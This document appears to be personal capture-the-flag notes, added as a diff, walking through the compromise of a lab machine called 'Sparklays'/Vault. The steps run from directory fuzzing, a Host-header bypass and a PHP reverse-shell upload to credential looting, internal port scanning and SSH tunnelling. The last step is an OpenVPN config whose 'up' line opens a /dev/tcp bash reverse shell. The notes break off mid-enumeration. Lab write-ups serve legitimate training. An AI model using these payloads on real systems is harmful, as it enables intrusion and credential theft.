@@ -1,0 +1,270 @@
+
+
+
+
+on 80 we find
+"Welcome to the Slowdaddy web interface
+
+We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.
+
+We are proud to announce our first client: Sparklays (Sparklays.com still under construction) "
+
+we find a forbidden directory at /sparklays
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://10.10.10.109/sparklays/FUZZ --hc 404,403
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.109/sparklays/FUZZ
+Total requests: 2565
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000586:   200        13 L     38 W       615 Ch      "admin.php"                                         
+000001621:   200        3 L      2 W        16 Ch       "login.php"                                         
+
+Total time: 0
+Processed Requests: 2565
+Filtered Requests: 2563
+Requests/sec.: 0
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+we see denied acess to login but we are able to try at admin.php
+
+GET /sparklays/admin.php HTTP/1.1
+Host: 10.10.10.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+
+if we change the host header to localhost
+we are redirected to
+
+GET /sparklays/sparklays-local-admin-interface-0001.php HTTP/1.1
+Host: 10.10.10.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+we see two clickables, server and design settings.
+in design settings we have upload functionality
+
+
+https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt
+
+
+
+we can use the sniper in burp or:
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -z file,fileext.txt --hh 519 -H "Content-Type: multipart/form-data; boundary=---------------------------31098861492102052165321427923" -d $'-----------------------------31098861492102052165321427923\r\nContent-Disposition: form-data; name="file"; filename="FUZZ"\r\n\r\n\r\n-----------------------------31098861492102052165321427923\r\nContent-Disposition: form-data; name="submit"\r\n\r\nupload file\r\n-----------------------------31098861492102052165321427923--\r\n' http://10.10.10.109/sparklays/design/changelogo.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.109/sparklays/design/changelogo.php
+Total requests: 605
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000099:   200        18 L     47 W       526 Ch      ".csv"                                              
+000000188:   200        18 L     47 W       526 Ch      ".GIF"                                              
+000000187:   200        18 L     47 W       526 Ch      ".Gif"                                              
+000000186:   200        18 L     47 W       526 Ch      ".gif"                                              
+000000249:   200        18 L     47 W       526 Ch      ".jpg"                                              
+000000251:   200        18 L     47 W       526 Ch      ".JPG"                                              
+000000250:   200        18 L     47 W       526 Ch      ".Jpg"                                              
+000000247:   200        18 L     47 W       526 Ch      ".Jpeg"                                             
+000000248:   200        18 L     47 W       526 Ch      ".JPEG"                                             
+000000246:   200        18 L     47 W       526 Ch      ".jpeg"                                             
+000000380:   200        18 L     47 W       526 Ch      ".PNG"                                              
+000000379:   200        18 L     47 W       526 Ch      ".png"                                              
+000000370:   200        18 L     47 W       526 Ch      ".php5"                                             
+
+Total time: 1.702623
+Processed Requests: 605
+Filtered Requests: 592
+Requests/sec.: 355.3340
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+we identify an uploads directory and go for our payload
+
+http://10.10.10.109/sparklays/design/uploads/php-reverse-shell.php5
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53       
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.10.109] 42532
+Linux ubuntu 4.13.0-45-generic #50~16.04.1-Ubuntu SMP Wed May 30 11:18:27 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 10:31:39 up  1:04,  0 users,  load average: 0.02, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+two users, alex and dave are on the machine. Alex is less permissive.
+
+www-data@ubuntu:/home/dave/Desktop$ ls -lsa
+total 20
+4 drwxr-xr-x  2 dave dave 4096 Jun  2  2021 .
+4 drwxr-xr-x 18 dave dave 4096 Jun  2  2021 ..
+4 -rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
+4 -rw-rw-r--  1 alex alex   14 Jul 17  2018 key
+4 -rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh
+www-data@ubuntu:/home/dave/Desktop$ 
+
+www-data@ubuntu:/home/dave/Desktop$ cat key
+itscominghome
+www-data@ubuntu:/home/dave/Desktop$ cat ssh
+dave
+Dav3therav3123
+www-data@ubuntu:/home/dave/Desktop$ cat Servers 
+DNS + Configurator - 192.168.122.4
+Firewall - 192.168.122.5
+The Vault - x
+www-data@ubuntu:/home/dave/Desktop$ 
+
+
+
+typically we could use a static nmap binary, or we could:
+nc -nz 192.168.122.4 1-100 
+but this is not working on the box.
+
+so we
+www-data@ubuntu:/home/dave/Desktop$ for p in $(seq 1 100); do nc -vz 192.168.122.4 $p; done
+...
+nc: connect to 192.168.122.4 port 21 (tcp) failed: Connection refused
+Connection to 192.168.122.4 22 port [tcp/ssh] succeeded!
+nc: connect to 192.168.122.4 port 23 (tcp) failed: Connection refused
+..
+nc: connect to 192.168.122.4 port 79 (tcp) failed: Connection refused
+Connection to 192.168.122.4 80 port [tcp/http] succeeded!
+nc: connect to 192.168.122.4 port 81 (tcp) failed: Connection refused
+...
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -L 9001:192.168.122.4:80 dave@10.10.10.109
+...
+dave@ubuntu:~$ 
+
+navigate to 
+http://localhost:9001/
+
+ Welcome to the Sparklays DNS Server
+
+Click here to modify your DNS Settings
+Click here to test your VPN Configuration 
+
+the dns settings page is returned not found
+vpn configurator is, allowing us to modify "your .ovpn file and execute it"
+" Note: nobind must be used. "
+there is also a test vpn button
+
+fuzzing find /notes
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://localhost:9001/FUZZ --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://localhost:9001/FUZZ
+Total requests: 119600
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+...                                           
+000001660:   200        1 L      6 W        36 Ch       "notes"   
+
+contains
+
+chmod 123.ovpn and script.sh to 777
+
+
+we look at exploiting the ovpn config
+https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da
+
+we abuse OpenVPN's config options that execute shell commands
+
+this explains the nc permissiveness on the box
+we have to keep in mind that only root can bind to ports below 1024
+
+we use
+
+remote 192.168.122.1
+ifconfig 10.200.0.2 10.200.0.1
+dev tun
+script-security 2
+nobind
+up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/1337 0<&1 2>&1 &'"
+
+and upon hitting update file we receive a shell
+
+dave@ubuntu:~$ nc -lvnp 1337
+Listening on [0.0.0.0] (family 0, port 1337)
+Connection from [192.168.122.4] port 1337 [tcp/*] accepted (family 2, sport 35964)
+bash: cannot set terminal process group (1113): Inappropriate ioctl for device
+bash: no job control in this shell
+root@DNS:/var/www/html# 
+
+root@DNS:/home/dave# cat ssh
+cat ssh
+dave
+dav3gerous567
+root@DNS:/home/dave# 
+
+
+
+
+root@DNS:/home/alex# cat .bash_history 
+...
+ping 192.168.5.2
+
+
+"The file /var/log/auth.log is examined, and interesting nmap and ncat commands targeting
+192.168.5.2 are visible."
+
+
+
+
+
+
+
+
+
+
+
